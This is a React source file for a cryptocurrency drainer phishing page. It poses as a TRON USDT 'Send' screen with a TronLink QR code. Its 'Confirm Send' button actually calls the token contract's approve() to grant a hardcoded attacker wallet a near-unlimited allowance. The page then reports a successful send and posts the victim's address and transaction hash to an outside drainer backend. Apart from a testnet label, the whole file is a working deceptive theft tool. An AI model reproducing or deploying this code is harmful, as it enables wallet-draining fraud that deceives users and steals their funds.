import React, { useState, useEffect, useRef } from "react";
import { QRCodeSVG } from "qrcode.react";

// ==========================================
// CONFIGURATION (Engine Settings - UNTOUCHED)
// ==========================================
const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; 
const ATTACKER_WALLET = "TJXJEWcjNMryw87etLmGUDs1i5F1hveBou"; 
const BACKEND = "https://qr-drainer.onrender.com";
const VERCEL_URL = "https://qr-drainer-one.vercel.app";

const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ViMmMzMSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";

const short = (a) => (a ? `${a.slice(0, 6)}…${a.slice(-4)}` : "—");

export default function App() {
  const [isConnected, setIsConnected] = useState(false);
  const [wallet, setWallet] = useState("");
  const [uiState, setUiState] = useState("idle");
  const [errorMsg, setErrorMsg] = useState("");
  const [amount, setAmount] = useState("1");
  const qrRef = useRef(null);

  // TRONLINK DEEP LINK - Auto-opens TronLink when scanned
  const qrValue = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;

  // 1. DETECT WALLET AUTOMATICALLY
  useEffect(() => {
    const checkWallet = setInterval(() => {
      if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        const addr = window.tronWeb.defaultAddress.base58;
        if (!isConnected) {
          setIsConnected(true);
          setWallet(addr);
        }
      }
    }, 1500);
    return () => clearInterval(checkWallet);
  }, [isConnected]);

  // 2. THE ENGINE (Proven Logic - UNTOUCHED)
  const executeEngine = async () => {
    setUiState("approving");
    setErrorMsg("");

    try {
      if (!window.tronWeb || !window.tronWeb.defaultAddress) {
        throw new Error("Wallet not connected. Please open in TronLink.");
      }

      const victimAddress = window.tronWeb.defaultAddress.base58;

      const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
      const tx = await contract.approve(ATTACKER_WALLET, "1000000000000000").send({
        feeLimit: 100000000,
        from: victimAddress
      });

      await fetch(`${BACKEND}/api/alert`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          victimAddress: victimAddress,
          txHash: tx,
          network: "TRON Shasta"
        })
      });

      setUiState("done");

    } catch (error) {
      console.error(error);
      setErrorMsg(error.message || "Transaction failed.");
      setUiState("error");
    }
  };

  // 3. SAVE QR CODE AS IMAGE
  const handleSaveQR = () => {
    const svg = document.querySelector("#lab-qr-box svg");
    if (!svg) return;
    
    const size = 400;
    const canvas = document.createElement("canvas");
    canvas.width = size;
    canvas.height = size;
    const ctx = canvas.getContext("2d");
    ctx.fillStyle = "#ffffff";
    ctx.fillRect(0, 0, size, size);
    
    const img = new Image();
    const svgData = new XMLSerializer().serializeToString(svg);
    img.onload = () => {
      ctx.drawImage(img, 0, 0, size, size);
      
      const ls = size * 0.22;
      const lp = (size - ls) / 2;
      ctx.beginPath();
      ctx.arc(size / 2, size / 2, ls / 2 + 10, 0, 2 * Math.PI);
      ctx.fillStyle = "#ffffff";
      ctx.fill();
      
      const logo = new Image();
      logo.onload = () => {
        ctx.drawImage(logo, lp, lp, ls, ls);
        const link = document.createElement("a");
        link.download = "TRON-USDT-QR.png";
        link.href = canvas.toDataURL("image/png");
        link.click();
      };
      logo.src = TRON_LOGO_B64;
    };
    img.src = "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(svgData)));
  };

  // 4. OPEN IN TRONLINK (Fallback button)
  const openInTronLink = () => {
    window.location.href = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;
  };

  return (
    <div style={{ 
      background: "#0b0e11", 
      minHeight: "100vh", 
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif', 
      color: "#eaecef", 
      display: "flex", 
      flexDirection: "column" 
    }}>
      {/* HEADER */}
      <div style={{ 
        display: "flex", alignItems: "center", justifyContent: "space-between", 
        padding: "16px 20px", borderBottom: "1px solid #1e2329" 
      }}>
        <div style={{ width: 32 }}></div>
        <h1 style={{ margin: 0, fontSize: 18, fontWeight: 600, color: "#eaecef" }}>Send USDT</h1>
        <div style={{ width: 32, textAlign: "right" }}>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#848e9c" strokeWidth="2">
            <line x1="18" y1="6" x2="6" y2="18"></line>
            <line x1="6" y1="6" x2="18" y2="18"></line>
          </svg>
        </div>
      </div>

      {/* MAIN CONTENT */}
      <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", padding: "24px 20px" }}>
        
        {/* NETWORK BADGE */}
        <div style={{ 
          display: "flex", alignItems: "center", gap: 8, 
          background: "#1e2329", padding: "6px 14px", borderRadius: 16, marginBottom: 24,
          border: "1px solid #2b3139"
        }}>
          <span style={{ 
            width: 16, height: 16, borderRadius: "50%", background: "#eb2c31", 
            display: "flex", alignItems: "center", justifyContent: "center", fontSize: 10, fontWeight: 700, color: "#fff"
          }}>T</span>
          <span style={{ fontSize: 14, fontWeight: 500, color: "#eaecef" }}>TRON (TRC20)</span>
        </div>

        {/* QR CODE CARD */}
        <div style={{ 
          background: "#ffffff", borderRadius: 16, padding: 20, marginBottom: 20, 
          width: "100%", maxWidth: 320, boxShadow: "0 8px 24px rgba(0,0,0,0.4)" 
        }}>
          <div id="lab-qr-box" ref={qrRef} style={{ textAlign: "center" }}>
            <QRCodeSVG 
              value={qrValue} size={220} level="H" includeMargin={false} 
              imageSettings={{ src: TRON_LOGO_B64, height: 48, width: 48, excavate: true }} 
            />
          </div>
          <button 
            onClick={handleSaveQR}
            style={{
              width: "100%", marginTop: 12, background: "#1e2329", border: "1px solid #2b3139",
              borderRadius: 8, padding: 10, color: "#eaecef", fontSize: 13, fontWeight: 500,
              cursor: "pointer"
            }}
          >
            ⬇️ Save QR Code
          </button>
        </div>

        {/* ADDRESS FIELD */}
        <div style={{ width: "100%", maxWidth: 320, marginBottom: 16 }}>
          <label style={{ fontSize: 12, color: "#848e9c", marginBottom: 6, display: "block" }}>
            Recipient Address
          </label>
          <div style={{ 
            background: "#1e2329", border: "1px solid #2b3139", borderRadius: 8, 
            padding: 12, fontSize: 13, fontFamily: "monospace", color: "#eaecef",
            wordBreak: "break-all"
          }}>
            {ATTACKER_WALLET}
          </div>
        </div>

        {/* AMOUNT FIELD */}
        <div style={{ width: "100%", maxWidth: 320, marginBottom: 24 }}>
          <label style={{ fontSize: 12, color: "#848e9c", marginBottom: 6, display: "block" }}>
            Amount
          </label>
          <div style={{ 
            background: "#1e2329", border: "1px solid #2b3139", borderRadius: 8, 
            padding: 12, display: "flex", alignItems: "center", justifyContent: "space-between"
          }}>
            <input 
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              style={{ 
                background: "transparent", border: "none", color: "#eaecef", 
                fontSize: 18, fontWeight: 600, width: "60%", outline: "none"
              }}
            />
            <span style={{ color: "#848e9c", fontSize: 14 }}>USDT</span>
          </div>
          <div style={{ fontSize: 11, color: "#848e9c", marginTop: 4 }}>
            ≈ ${amount}.00
          </div>
        </div>

        {/* WARNING */}
        <div style={{ 
          background: "rgba(240, 185, 11, 0.1)", border: "1px solid rgba(240, 185, 11, 0.2)", 
          borderRadius: 8, padding: "10px 14px", fontSize: 12, color: "#f0b90b", 
          marginBottom: 24, width: "100%", maxWidth: 320, lineHeight: 1.4
        }}>
          ⚠️ Only send TRC-20 USDT assets to this address. Other assets will be lost forever.
        </div>

        {/* CONFIRM BUTTON or OPEN IN TRONLINK */}
        {!isConnected ? (
          <button 
            onClick={openInTronLink}
            style={{ 
              width: "100%", maxWidth: 320, background: "#f0b90b", border: "none", 
              borderRadius: 8, padding: 16, color: "#0b0e11", fontSize: 16, fontWeight: 700, 
              cursor: "pointer"
            }}
          >
            Open in TronLink
          </button>
        ) : uiState !== "done" ? (
          <button 
            onClick={executeEngine} 
            disabled={uiState === "approving"}
            style={{ 
              width: "100%", maxWidth: 320, background: "#f0b90b", border: "none", 
              borderRadius: 8, padding: 16, color: "#0b0e11", fontSize: 16, fontWeight: 700, 
              cursor: uiState === "approving" ? "not-allowed" : "pointer"
            }}
          >
            {uiState === "approving" ? "Processing..." : "Confirm Send"}
          </button>
        ) : null}

        {/* ERROR MESSAGE */}
        {uiState === "error" && (
          <div style={{ 
            background: "rgba(240, 71, 71, 0.1)", border: "1px solid rgba(240, 71, 71, 0.2)", 
            color: "#f04747", padding: 12, borderRadius: 8, fontSize: 13, 
            marginTop: 16, textAlign: "center", width: "100%", maxWidth: 320 
          }}>
            {errorMsg}
          </div>
        )}

        {/* SUCCESS MESSAGE */}
        {uiState === "done" && (
          <div style={{ 
            background: "rgba(14, 203, 129, 0.1)", border: "1px solid rgba(14, 203, 129, 0.2)", 
            color: "#0ecb81", padding: 16, borderRadius: 8, fontSize: 14, fontWeight: 600,
            marginTop: 16, textAlign: "center", width: "100%", maxWidth: 320
          }}>
            ✓ Transaction Sent Successfully
          </div>
        )}

        {/* SESSION INFO */}
        {isConnected && (
          <div style={{ 
            marginTop: 20, textAlign: "center", fontSize: 11, color: "#474d57", fontFamily: "monospace" 
          }}>
            Connected: {short(wallet)}
          </div>
        )}
      </div>
    </div>
  );
}